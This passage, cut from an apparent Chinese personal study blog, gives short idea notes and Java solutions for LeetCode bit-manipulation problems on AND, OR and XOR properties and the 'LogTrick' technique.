class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="693-交替位二进制数"><a href="#693-交替位二进制数" class="headerlink" title="693. 交替位二进制数"></a><a href="https://leetcode.cn/problems/binary-number-with-alternating-bits/">693. 交替位二进制数</a></h3><p>思路一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分别看是否有连续1和连续0</span><br></pre></td></tr></table></figure>

<p>代码一</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasAlternatingBits</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">mask</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (mask &lt;= n)&#123;</span><br><span class="line">            mask &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mask = mask - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rev</span> <span class="operator">=</span> (<span class="type">int</span>) (n ^ mask);</span><br><span class="line">        <span class="keyword">return</span> ((n &amp; (n &gt;&gt; <span class="number">1</span>)) == <span class="number">0</span>) &amp;&amp; ((rev &amp; (rev &gt;&gt; <span class="number">1</span>)) == <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对输入 n 的二进制表示右移一位后，得到的数字再与 n 按位异或得到 a。当且仅当输入 n 为交替位二进制数时，a 的二进制表示全为 1（不包括前导 0）。这里进行简单证明：当 a 的某一位为 1 时，当且仅当 n 的对应位和其前一位相异。当 a 的每一位为 1 时，当且仅当 n 的所有相邻位相异，即 n 为交替位二进制数。</span><br><span class="line"></span><br><span class="line">将 a 与 a+1 按位与，当且仅当 a 的二进制表示全为 1 时，结果为 0。这里进行简单证明：当且仅当 a 的二进制表示全为 1 时，a+1 可以进位，并将原最高位置为 0，按位与的结果为 0。否则，不会产生进位，两个最高位都为 1，相与结果不为 0。</span><br><span class="line"></span><br><span class="line">结合上述两步，可以判断输入是否为交替位二进制数。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码二</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasAlternatingBits</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> n ^ (n &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> (a &amp; (a + <span class="number">1</span>)) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="与或（AND-x2F-OR）的性质"><a href="#与或（AND-x2F-OR）的性质" class="headerlink" title="与或（AND&#x2F;OR）的性质"></a>与或（AND&#x2F;OR）的性质</h2><h3 id="2980-检查按位或是否存在尾随零"><a href="#2980-检查按位或是否存在尾随零" class="headerlink" title="2980. 检查按位或是否存在尾随零"></a><a href="https://leetcode.cn/problems/check-if-bitwise-or-has-trailing-zeros/">2980. 检查按位或是否存在尾随零</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">即判断是否存在两个即以上偶数</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasTrailingZeros</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (num % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(flag) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1318-或运算的最小翻转次数"><a href="#1318-或运算的最小翻转次数" class="headerlink" title="1318. 或运算的最小翻转次数"></a><a href="https://leetcode.cn/problems/minimum-flips-to-make-a-or-b-equal-to-c/">1318. 或运算的最小翻转次数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先计算出a | b 的值</span><br><span class="line">然后异或c看看不同的位数，然后模拟即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minFlips</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> a | b;</span><br><span class="line">        <span class="type">int</span> <span class="variable">diff</span> <span class="operator">=</span> x ^ c;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (diff &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> diff - ((diff &amp; (diff - <span class="number">1</span>)));</span><br><span class="line">            diff &amp;= (diff - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ((cur &amp; c) != <span class="number">0</span>) &#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>((a &amp; cur) != <span class="number">0</span>) res++;</span><br><span class="line">                <span class="keyword">if</span>((b &amp; cur) != <span class="number">0</span>) res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2419-按位与最大的最长子数组"><a href="#2419-按位与最大的最长子数组" class="headerlink" title="2419. 按位与最大的最长子数组"></a><a href="https://leetcode.cn/problems/longest-subarray-with-maximum-bitwise-and/">2419. 按位与最大的最长子数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">与不会增加值。也就是先找到最大值，然后看是否连续出现，连续出现计算个数即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestSubarray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span>(num &gt; maxVal)&#123;</span><br><span class="line">                res = <span class="number">1</span>;</span><br><span class="line">                maxVal = num;</span><br><span class="line">                count = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num == maxVal) &#123;</span><br><span class="line">                count++;</span><br><span class="line">                res = Integer.max(res, count);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                count = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2871-将数组分割成最多数目的子数组"><a href="#2871-将数组分割成最多数目的子数组" class="headerlink" title="2871. 将数组分割成最多数目的子数组"></a><a href="https://leetcode.cn/problems/split-array-into-maximum-number-of-subarrays/">2871. 将数组分割成最多数目的子数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 是减少的工具。</span><br><span class="line">数组整体and 的值和一定最小。</span><br><span class="line">然后分两种情况：</span><br><span class="line">整体and为0 =》 答案可能不为1 每一块子区域为0就加一，最后一块不为1则加入上一块</span><br><span class="line">整体and 不为 0 =》 答案一定为1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubarrays</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">andSum</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            andSum &amp;= num;</span><br><span class="line">            <span class="keyword">if</span>(andSum == <span class="number">0</span>)&#123;</span><br><span class="line">                res++;</span><br><span class="line">                andSum = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(andSum != -<span class="number">1</span> &amp;&amp; res == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3133-数组最后一个元素的最小值"><a href="#3133-数组最后一个元素的最小值" class="headerlink" title="3133. 数组最后一个元素的最小值"></a><a href="https://leetcode.cn/problems/minimum-array-end/">3133. 数组最后一个元素的最小值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">填空位即可</span><br></pre></td></tr></table></figure>

<p>代码（模拟写法）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public long minEnd(int n, int x) &#123;</span><br><span class="line">        int mask = n - 1;//为0的位置补上1</span><br><span class="line">        boolean[] arr = new boolean[63];</span><br><span class="line">        int tempX = x;</span><br><span class="line">        int count = 0;</span><br><span class="line">        while (tempX != 0)&#123;</span><br><span class="line">            arr[count] = (tempX % 2 == 1);</span><br><span class="line">            tempX &gt;&gt;= 1;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        int i = 0;</span><br><span class="line">        while (mask != 0)&#123;</span><br><span class="line">            while (arr[i])&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            arr[i] = (mask % 2 == 1);</span><br><span class="line">            mask &gt;&gt;= 1;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        long res = 0;</span><br><span class="line">        long base = 1;</span><br><span class="line">        for (boolean l : arr) &#123;</span><br><span class="line">            if(l)&#123;</span><br><span class="line">                res += base;</span><br><span class="line">            &#125;</span><br><span class="line">            base *= 2;</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码（非模拟写法）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">minEnd</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mask</span> <span class="operator">=</span> n - <span class="number">1</span>;<span class="comment">//为0的位置补上1</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> x;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//res的第i位</span></span><br><span class="line">        <span class="keyword">while</span> (mask != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> ((res &amp; (<span class="number">1L</span> &lt;&lt; i)) != <span class="number">0</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mask % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                res |= (<span class="number">1L</span> &lt;&lt; i);</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">            mask &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2680-最大或值"><a href="#2680-最大或值" class="headerlink" title="2680. 最大或值"></a><a href="https://leetcode.cn/problems/maximum-or/">2680. 最大或值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">贪心+前缀和+枚举</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">maximumOr</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] preSum = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            preSum[i + <span class="number">1</span>] = preSum[i] | nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            res = Long.max(res, prev | ((<span class="type">long</span>) nums[i] &lt;&lt; k) | preSum[i]);</span><br><span class="line">            prev |= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="LogTrick"><a href="#LogTrick" class="headerlink" title="LogTrick"></a>LogTrick</h2><p>或只会越来越大，和只会越来越小</p>
<h3 id="3097-或值至少为-K-的最短子数组-II"><a href="#3097-或值至少为-K-的最短子数组-II" class="headerlink" title="3097. 或值至少为 K 的最短子数组 II"></a><a href="https://leetcode.cn/problems/shortest-subarray-with-or-at-least-k-ii/">3097. 或值至少为 K 的最短子数组 II</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">遍历i过程中修改nums[j] (i&lt;j) 对于给定i是，nums[j]的意思是 nums[j]到nums[i]的子数组的或值.越前面集合越大</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minimumSubarrayLength</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt;= k) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i - <span class="number">1</span>; j &gt;=<span class="number">0</span> &amp;&amp; (nums[j] | nums[i]) != nums[j]; j--)&#123;</span><br><span class="line">                nums[j] |= nums[i];</span><br><span class="line">                <span class="keyword">if</span>(nums[j] &gt;= k)&#123;</span><br><span class="line">                    res = Integer.min(res, i - j + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res == Integer.MAX_VALUE ? -<span class="number">1</span> : res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2411-按位或最大的最小子数组长度"><a href="#2411-按位或最大的最小子数组长度" class="headerlink" title="2411. 按位或最大的最小子数组长度"></a><a href="https://leetcode.cn/problems/smallest-subarrays-with-maximum-bitwise-or/">2411. 按位或最大的最小子数组长度</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">或只会变大 + 集合思维</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] smallestSubarrays(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            res[i] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i - <span class="number">1</span>; j &gt;= <span class="number">0</span> &amp;&amp; (nums[j] | nums[i]) != nums[j]; j--) &#123;</span><br><span class="line">                nums[j] |= nums[i];</span><br><span class="line">                res[j] = i - j + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3209-子数组按位与值为-K-的数目"><a href="#3209-子数组按位与值为-K-的数目" class="headerlink" title="3209. 子数组按位与值为 K 的数目"></a><a href="https://leetcode.cn/problems/number-of-subarrays-with-and-value-of-k/">3209. 子数组按位与值为 K 的数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">跟前面几题相似，需要加入二分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">countSubarrays</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="comment">//nums递增</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="comment">//            if(nums[i] == k) res++;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i - <span class="number">1</span>; j &gt;= <span class="number">0</span> &amp;&amp; (nums[j] &amp; nums[i]) != nums[j]; j--) &#123;</span><br><span class="line">                nums[j] &amp;= nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            res += lower_bound(nums, <span class="number">0</span>, i, k + <span class="number">1</span>) - lower_bound(nums, <span class="number">0</span>, i, k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="comment">//大于等于target的第一个位置</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] &gt;= target) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nums[left] &lt; target) <span class="keyword">return</span> right + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>todo:之后理解下方法二，方法三<a href="https://leetcode.cn/problems/number-of-subarrays-with-and-value-of-k/solutions/2833497/jian-ji-xie-fa-o1-kong-jian-pythonjavacg-u7fv/">题解</a></p>
<h2 id="异或（XOR）的性质"><a href="#异或（XOR）的性质" class="headerlink" title="异或（XOR）的性质"></a>异或（XOR）的性质</h2><h3 id="1720-解码异或后的数组"><a href="#1720-解码异或后的数组" class="headerlink" title="1720. 解码异或后的数组"></a><a href="https://leetcode.cn/problems/decode-xored-array/">1720. 解码异或后的数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有点像reverse。。。。。</span><br><span class="line">encoded[i] = arr[i] XOR arr[i + 1] =&gt; arr[i + 1] = encoded[i] XOR arr[i]</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] decode(<span class="type">int</span>[] encoded, <span class="type">int</span> first) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> encoded.length + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        res[<span class="number">0</span>] = first;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            res[i] = res[i - <span class="number">1</span>] ^ encoded[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2433-找出前缀异或的原始数组"><a href="#2433-找出前缀异或的原始数组" class="headerlink" title="2433. 找出前缀异或的原始数组"></a><a href="https://leetcode.cn/problems/find-the-original-array-of-prefix-xor/">2433. 找出前缀异或的原始数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">异或性质 ; a^a = 0 0^a = a</span><br><span class="line">res[i] = pref[i] ^ pref[i - 1];</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] findArray(<span class="type">int</span>[] pref) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> pref.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        res[<span class="number">0</span>] = pref[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            res[i] = pref[i] ^ pref[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2683-相邻值的按位异或"><a href="#2683-相邻值的按位异或" class="headerlink" title="2683. 相邻值的按位异或"></a><a href="https://leetcode.cn/problems/neighboring-bitwise-xor/">2683. 相邻值的按位异或</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存在性问题。</span><br><span class="line">derived[i] = original[i] ⊕ original[0]</span><br><span class="line">那么有所有的derived[i] for i in [0,n-1]:xorSum = 0</span><br><span class="line">验证即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">doesValidArrayExist</span><span class="params">(<span class="type">int</span>[] derived)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">xorSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : derived) &#123;</span><br><span class="line">            xorSum ^= i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> xorSum == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1829-每个查询的最大异或值"><a href="#1829-每个查询的最大异或值" class="headerlink" title="1829. 每个查询的最大异或值"></a><a href="https://leetcode.cn/problems/maximum-xor-for-each-query/">1829. 每个查询的最大异或值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模拟即可，最大值为1&lt;&lt;(maximumBit)-1</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int[] getMaximumXor(int[] nums, int maximumBit) &#123;</span><br><span class="line">        int n = nums.length;</span><br><span class="line">        int xorSum = 0;</span><br><span class="line">        int[] res = new int[n];</span><br><span class="line">        int target = (1 &lt;&lt; maximumBit) - 1;</span><br><span class="line">        for (int num : nums) &#123;</span><br><span class="line">            xorSum ^= num;</span><br><span class="line">        &#125;</span><br><span class="line">        for (int i = n - 1; i &gt;= 0; i--) &#123;</span><br><span class="line">            res[n - 1 - i] = xorSum ^ target;</span><br><span class="line">            xorSum ^= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2997-使数组异或和等于-K-的最少操作次数"><a href="#2997-使数组异或和等于-K-的最少操作次数" class="headerlink" title="2997. 使数组异或和等于 K 的最少操作次数"></a><a href="https://leetcode.cn/problems/minimum-number-of-operations-to-make-array-xor-equal-to-k/">2997. 使数组异或和等于 K 的最少操作次数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先求出异或和，在求出多少位为1就行</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minOperations</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">xorSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            xorSum ^= num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Integer.bitCount(xorSum ^ k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2429-最小异或"><a href="#2429-最小异或" class="headerlink" title="2429. 最小异或"></a><a href="https://leetcode.cn/problems/minimize-xor/">2429. 最小异或</a></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">思路先求出num2的置位数b。设num1的置位数为a</span><br><span class="line">若a&gt;=b 获取num1对应的高位即可</span><br><span class="line">若a&lt;=b  先把b所有1去掉，在填充空位</span><br></pre></td></tr></table></figure>

<p>代码</p>
